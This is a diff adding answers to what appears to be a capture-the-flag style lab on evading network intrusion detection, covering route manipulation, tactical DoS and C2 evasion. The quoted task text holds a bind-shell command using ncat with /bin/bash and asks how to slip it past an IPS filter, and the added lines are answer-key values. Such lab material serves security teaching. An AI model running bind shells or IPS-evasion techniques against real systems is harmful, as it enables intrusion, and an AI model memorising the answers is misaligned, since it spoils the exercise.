@@ -115,12 +115,19 @@
 
 ### On the attached machine from the previous task, browse to <http://MACHINE_IP:8080>, where you can write your Linux commands. Note that no output will be returned. A command like ncat -lvnp 1234 -e /bin/bash will create a bind shell that you can connect to it from the AttackBox using ncat MACHINE_IP 1234; however, some IPS is filtering out the command we are submitting on the form. Using one of the techniques mentioned in this task, try to adapt the command typed in the form to run properly. Once you connect to the bind shell using ncat MACHINE_IP 1234, find the user’s name
 
+    redteamnetsec
+> Tip: When you run the command you won't get any obvious response in the listner terminal so just write commands directly in order to get the response needed to complete the task
 # Task 6 Evasion via Route Manipulation
+    http socks4
 
 # Task 7 Evasion via Tactical DoS
+    No answer needed
 
 # Task 8 C2 and IDS/IPS Evasion
+    jitter
 
 # Task 9 Next-Gen Security
+    No answer needed
 
 # Task 10 Summary
+    No answer needed
